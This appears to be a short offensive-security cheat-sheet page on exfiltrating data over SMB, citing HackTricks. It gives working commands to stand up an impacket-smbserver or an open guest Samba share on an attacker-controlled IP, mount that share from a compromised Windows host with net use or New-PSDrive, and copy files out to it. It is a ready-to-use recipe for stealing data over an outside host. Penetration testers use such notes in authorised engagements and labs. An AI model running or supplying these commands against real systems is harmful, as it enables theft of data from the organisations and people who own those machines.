# Data Exfiltration Over SMB

Either [[Impacket-Cheatsheet]] - `impacket-smbserver` - beware the you are allowing Write access to your machine
```bash
impacket-smbserver -ip 10.10.10.10 sharenamehere $(pwd) -smb2support -user test -password test 
net use z: \\10.10.10.10\sharenamehere /user:test test
# Alternative with PowerShell:
New-PSDrive -Name "EXfilDisk" -PSProvider "FileSystem" -Root "\\10.10.10.10\sharenamehere"
# Then exfil 
copy $file Z:\
```

Or use Samba
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

## References

[HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#smb)